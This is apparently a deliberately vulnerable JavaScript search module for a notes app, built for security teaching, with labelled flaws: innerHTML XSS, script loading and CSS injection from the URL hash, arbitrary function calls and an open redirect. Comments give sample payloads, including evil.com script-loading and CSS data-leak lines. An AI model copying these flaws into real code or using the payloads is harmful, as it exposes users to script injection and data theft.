/**
 * SecureNotes Pro — Search Module
 * 
 * Handles note searching with real-time results.
 * Supports URL hash-based search for bookmarkable queries.
 */

'use strict';

// ── Search Notes ──────────────────────────────────────────────
// VULNERABILITY: DOM-based XSS via innerHTML sink
// User input (search query) is reflected directly into innerHTML without sanitization
function searchNotes() {
    const query = document.getElementById('search-input').value;
    const resultsDiv = document.getElementById('search-results');
    const resultsContent = document.getElementById('search-results-content');

    if (!query.trim()) {
        resultsDiv.style.display = 'none';
        return;
    }

    resultsDiv.style.display = 'block';
    debugLog('Search query: ' + query);

    // Get notes from storage
    const notes = JSON.parse(localStorage.getItem('notes') || '[]');
    const matching = notes.filter(n =>
        n.title.toLowerCase().includes(query.toLowerCase()) ||
        n.content.toLowerCase().includes(query.toLowerCase())
    );

    if (matching.length > 0) {
        // VULNERABLE: Note content (which may contain user HTML) rendered via innerHTML
        resultsContent.innerHTML = matching.map(n =>
            `<div class="note-card">
                <h3>${n.title}</h3>
                <div class="note-body">${n.content}</div>
                <div class="note-meta">
                    <span>${formatDate(n.date)}</span>
                </div>
            </div>`
        ).join('');
    } else {
        // VULNERABLE: Search query reflected directly into innerHTML
        // Payload example: <img src=x onerror=alert(1)>
        resultsContent.innerHTML = `
            <p style="color: #64748b; padding: 8px;">
                No results found for "<strong>${query}</strong>". 
                Try a different search term.
            </p>
        `;
    }
}


// ── URL Hash-based Search ─────────────────────────────────────
// VULNERABILITY: Hash fragment values processed unsafely
// Multiple dangerous operations based on hash content
function processHash() {
    const hash = window.location.hash.substring(1);
    if (!hash) return;

    debugLog('Processing hash: ' + hash);

    if (hash.startsWith('search=')) {
        // VULNERABLE: Hash value decoded and injected into search → innerHTML
        const searchQuery = decodeURIComponent(hash.split('search=')[1]);
        document.getElementById('search-input').value = searchQuery;
        searchNotes();

    } else if (hash.startsWith('load=')) {
        // VULNERABILITY: Dynamic script injection from hash fragment
        // Example: #load=https://evil.com/malicious.js
        const scriptUrl = decodeURIComponent(hash.split('load=')[1]);
        const script = document.createElement('script');
        script.src = scriptUrl;
        document.body.appendChild(script);
        debugLog('Loaded external script: ' + scriptUrl);

    } else if (hash.startsWith('style=')) {
        // VULNERABILITY: CSS injection via hash — can exfiltrate data with CSS
        // Example: #style=body{background:red}
        // Advanced: #style=input[value^="s"]{background:url(https://evil.com/?leak=s)}
        const cssPayload = decodeURIComponent(hash.split('style=')[1]);
        const styleEl = document.createElement('style');
        styleEl.textContent = cssPayload;
        document.head.appendChild(styleEl);
        debugLog('Injected custom styles');

    } else if (hash.startsWith('callback=')) {
        // VULNERABILITY: Arbitrary function execution from hash
        // Example: #callback=alert
        const fnName = decodeURIComponent(hash.split('callback=')[1]);
        if (typeof window[fnName] === 'function') {
            window[fnName]('SecureNotes callback triggered');
        }

    } else if (hash.startsWith('redirect=')) {
        // VULNERABILITY: Open redirect via hash fragment
        const redirectUrl = decodeURIComponent(hash.split('redirect=')[1]);
        debugLog('Redirecting to: ' + redirectUrl);
        window.location.href = redirectUrl;
    }
}

// Listen for hash changes
window.addEventListener('hashchange', processHash);

// Also support Enter key in search
document.addEventListener('DOMContentLoaded', function () {
    const searchInput = document.getElementById('search-input');
    if (searchInput) {
        searchInput.addEventListener('keypress', function (e) {
            if (e.key === 'Enter') searchNotes();
        });
    }
});
